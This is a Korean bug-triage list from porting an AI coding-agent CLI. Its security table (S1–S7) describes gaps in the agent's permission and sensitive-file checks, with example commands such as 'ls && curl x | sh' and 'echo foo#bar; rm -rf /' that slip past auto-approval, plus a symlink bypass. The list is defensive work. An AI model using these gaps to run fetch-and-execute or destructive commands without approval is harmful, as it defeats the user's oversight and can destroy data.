# cn 버그 후보 — 고칠지 결정 대기(계획 부록 B 후보)

> P1 이식 중 작업자들이 찾은 cn(커밋 5522c6f) 동작 중 버그로 보이는 것. **지금 ncn은 전부 cn과 똑같이 옮겨 두었다**(차등 시험 일치 우선).
> 결정 방법: 항목마다 "유지(cn과 같게)" / "고침(ncn 부록 B로 다르게)" 중 고른다. 고치는 것은 [ncn] 표시 + 옵션으로 cn 동작을 켤 수 있게 한다.
> 권장: ★ = 보안·데이터 손상 위험이 있어 고치기 권장. 나머지는 cn과 같게 두는 것을 권장(요청 본문 차이가 생기면 차등 시험이 깨짐).

## 보안·권한
| # | 내용 | 위치 | 권장 |
|---|---|---|---|
| S1 | "다시 묻지 않기"로 만든 규칙 `Bash(ls*)`가 `ls && curl x \| sh`까지 허용(막히는 건 disabled 명령뿐) | permissions | ★ 고침 — 저장 규칙은 명령 전체 일치로 |
| S2 | 명령이 `\| ls`처럼 시작하면 저장 규칙이 그냥 `Bash`가 되어 Bash 전체 허용 | permissions | ★ 고침 |
| S3 | 단어 중간 `#`을 주석으로 보는 우회: `echo foo#bar; rm -rf /` → 자동 승인 | terminal_security | ★ 고침 |
| S4 | Read가 링크를 따라가기 전 경로로 민감 파일 판정 → 심볼릭 링크로 우회 | read_file | ★ 고침 — 실제 경로로도 판정 |
| S5 | 절대경로는 "부모 폴더/파일 이름"만 판정 → `/p/secrets/sub/a.txt` 통과 | ignore | ★ 고침 |
| S6 | Write는 민감 파일 판정을 아예 안 함 | write_file | ★ 고침 |
| S7 | Search 패턴을 큰따옴표로 감싸 셸에 넘김 → 셸이 `$`·백틱 해석 | search | ★ 고침 — 인자 목록으로 실행 |
| S8 | `od`·`-o` 부분 문자열 검사가 넓어 `git log --oneline -- src/models`도 승인 필요 | terminal_security | 유지(안전 쪽으로 틀림) |
| S9 | permissions.yaml 대표 인자 이름이 실제와 다름(`Read(…)`가 `file_path` 등) → 패턴 불일치 | permissions | 고침 권장 |
| S10 | "다시 묻지 않기" 뒤 다시 읽을 때 CLI `--allow`/`--exclude`가 사라짐 | permissions | 고침 권장 |
| S11 | 잘못된 패턴 하나(`Bash(a(b))`)로 초기화 전체 실패 | permissions | 고침 권장 — 그 규칙만 무시+경고 |

## 동작·안정성
| # | 내용 | 위치 | 권장 |
|---|---|---|---|
| B1 | `requestOptions.timeout`(초)을 SDK에 그대로 넘김 → 밀리초로 해석(60 → 60ms) | llm | ★ 고침 — 초 단위로 |
| B2 | 연결 오류·시간 초과는 CLI 10회 재시도가 안 걸리고 SDK 2회만 | llm | 고침 권장(사내 LLM 불안정 대비) |
| B3 | 헤드리스에서 AskQuestion이 목록에 남아 답이 없으면 끝없이 대기 | ask_question | ★ 고침 — 헤드리스에서 제외 또는 즉시 오류 |
| B4 | Bash 출력 조각을 따로 해석 → 여러 바이트 글자가 경계에서 깨짐, Windows PowerShell 출력(CP949)도 UTF-8로 해석 | bash | ★ 고침(현장 Windows 한글 출력) |
| B5 | Bash 시간 초과 시 Ctrl+B 듣기 미해제, 실패 시 끝 알림 생략 | bash | 고침 권장 |
| B6 | Edit가 승인 뒤 파일을 다시 읽지 않고 미리 계산한 내용을 씀(승인 대기 중 사용자가 고친 내용 덮어씀) | edit | ★ 고침 — VS 연동 시 특히 |
| B7 | Edit·MultiEdit에서 없는 파일 → "File X does not exist" 대신 Node `ENOENT ... lstat` 글 | edit | 유지(글만 다름) |
| B8 | 대소문자 무시 찾기의 끝 위치 계산이 길이가 바뀌는 글자(İ)에서 어긋남 | findreplace | 고침 권장 |
| B9 | 기존 빈 파일에 Write → "Successfully created file" | write_file | 유지 |
| B10 | List: 깨진 링크 하나로 목록 전체 오류 | list_files | 고침 권장 |
| B11 | `--rule` 글이 시스템 메시지에 두 번, `--prompt` 글이 규칙으로 들어감 | sysmsg | 고침 권장(요청 본문 차이 발생 → 시나리오 별도) |
| B12 | 따옴표 없는 자리의 숫자·true 비밀값이 숫자·참거짓으로 바뀌어 검증 실패 | config | 고침 권장 |
| B13 | `git rev-parse` 출력이 "false"여도 git 저장소로 판정 | sysmsg | 유지(영향 작음) |
| B14 | validateContextLength(64000 상한 없음)와 getModelMaxTokens 값 불일치 | tokenizer | 유지(32k 모델엔 영향 없음) |
| B15 | 압축 위치(compactionIndex)가 사실상 효과 없음, 압축 요약 호출 중 기록이 주 대화에 섞임 | loop | P3에서 결정 |
| B16 | Subagent 동시 실행 시 전역 상태 경쟁(권한·시스템 메시지·기록 섞임) | subagent | ★ 고침(P3 — 독립 객체로) |
| B17 | `isModelCapable`의 `/o\d/`가 이름 어디든 'o'+숫자면 참(`foo2`) | registry | 유지(도구 목록이 바뀌면 cn과 달라짐) |
| B18 | Skills `getRelativePath` 앞부분 글자 비교(`/a/b` vs `/a/bc`) | skills | 고침 권장 |
| B19 | 비치명 경고 여러 개가 ","로 이어짐, 주입 슬러그 오류 글에 `[object Object]` | config | 유지(글만) |
| B20 | gpt-tokenizer가 BOM 토큰 10개를 못 찾음 | tokenizer | 유지(토큰 수를 cn과 같게) |

## 이미 cn과 다르게 한 것(작업자 판단 — 확인 필요)
| # | 내용 | 비고 |
|---|---|---|
| D1 | 재시도 때 앞 시도에서 받은 조각을 버림(cn은 중복) | `discard_partial_on_retry=False`로 cn 동작 |
| D2 | Skills 목록을 이름순으로 고정(cn은 파일 읽은 순서라 비결정) | 차등 시험 재현성 |
| D3 | Fetch: Node 24 URL 처리 문제(`#` 상대 링크 → `about:blank/…`)는 옮기지 않음 | Node 버전마다 다름 |
| D4 | 재시도 시 SDK 기본 헤더 등 일부는 근사 | 비교 대상 헤더 아님 |

## 통합 단계에서 추가
| # | 내용 | 권장 |
|---|---|---|
| B21 | `HistoryManager.load`가 없는 id에도 빈 세션 → `--fork`의 "not found" 경로가 실행 안 됨 | 고침 권장 |
| B22 | `-p`에서 알 수 없는 옵션·값 없는 옵션이 아무 글 없이 종료 코드 1 | 고침 권장 — stderr에 이유 |
| B23 | `--resume`이 작업 폴더와 상관없이 가장 최근 세션을 불러옴 | 고침 권장(VS에서 솔루션별로 쓰면 섞임) |
